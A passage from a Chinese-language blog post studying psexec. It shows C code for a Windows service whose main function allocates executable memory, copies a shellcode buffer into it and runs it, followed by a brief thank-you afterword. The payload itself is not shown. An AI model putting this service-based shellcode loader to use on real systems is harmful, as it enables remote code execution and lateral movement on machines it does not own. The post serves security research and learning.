class="hljs-comment">/*在本例中只接受系统关机和停止服务两种控制命令*/</span><br>    ServiceStatus.dwControlsAccepted =<br>        SERVICE_ACCEPT_SHUTDOWN |<br>        SERVICE_ACCEPT_STOP;<br>    ServiceStatus.dwWin32ExitCode = <span class="hljs-number">0</span>;<br>    ServiceStatus.dwServiceSpecificExitCode = <span class="hljs-number">0</span>;<br>    ServiceStatus.dwCheckPoint = <span class="hljs-number">0</span>;<br>    ServiceStatus.dwWaitHint = <span class="hljs-number">0</span>;<br>    hStatus = ::<span class="hljs-built_in">RegisterServiceCtrlHandler</span>(<br>        WserviceName,<br>        (LPHANDLER_FUNCTION)CtrlHandler);<br>    <span class="hljs-keyword">if</span> (hStatus == (SERVICE_STATUS_HANDLE)<span class="hljs-number">0</span>)<br>    &#123;<br><br>        <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;RegisterServiceCtrlHandler failed&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;RegisterServiceCtrlHandler success&quot;</span>);<br>    <span class="hljs-comment">/* Initialize Service   */</span><br>    error = <span class="hljs-built_in">InitService</span>();<br>    <span class="hljs-keyword">if</span> (error)<br>    &#123;<br>        <span class="hljs-comment">/* Initialization failed  */</span><br>        ServiceStatus.dwCurrentState =<br>            SERVICE_STOPPED;<br>        ServiceStatus.dwWin32ExitCode = <span class="hljs-number">-1</span>;<br>        <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    LPVOID Memory = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(Memory, buf, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf));<br>    ((<span class="hljs-built_in"><span class="hljs-keyword">void</span></span>(*)())Memory)();<br><br>    <span class="hljs-comment">/*向SCM 报告运行状态*/</span><br>    ServiceStatus.dwCurrentState =<br>        SERVICE_RUNNING;<br>    <span class="hljs-built_in">SetServiceStatus</span>(hStatus, &amp;ServiceStatus);<br><br>    <span class="hljs-comment">/*do something you want to do in this while loop*/</span><br>    MEMORYSTATUS memstatus;<br>    <span class="hljs-keyword">while</span> (ServiceStatus.dwCurrentState ==<br>        SERVICE_RUNNING)<br>    &#123;<br>        <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">16</span>];<br>        <span class="hljs-built_in">GlobalMemoryStatus</span>(&amp;memstatus);<br>        <span class="hljs-keyword">int</span> availmb = memstatus.dwAvailPhys / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span>;<br>        <span class="hljs-built_in">sprintf_s</span>(buffer, <span class="hljs-number">100</span>, <span class="hljs-string">&quot;available memory is %dMB&quot;</span>, availmb);<br>        <span class="hljs-keyword">int</span> result = <span class="hljs-built_in">WriteToLog</span>(buffer);<br>        <span class="hljs-keyword">if</span> (result)<br>        &#123;<br>            ServiceStatus.dwCurrentState = SERVICE_STOPPED;<br>            ServiceStatus.dwWin32ExitCode = <span class="hljs-number">-1</span>;<br>            <span class="hljs-built_in">SetServiceStatus</span>(hStatus,<br>                &amp;ServiceStatus);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-built_in">Sleep</span>(SLEEP_TIME);<br>    &#125;<br>    <span class="hljs-built_in">WriteToLog</span>(<span class="hljs-string">&quot;service stopped&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/psexec/24.png"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本次研究psexec到这就基本结束了,我自己是没有能力研究出来的,参考了很多大佬的文章,尤其是倾旋大佬,再次感谢！</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
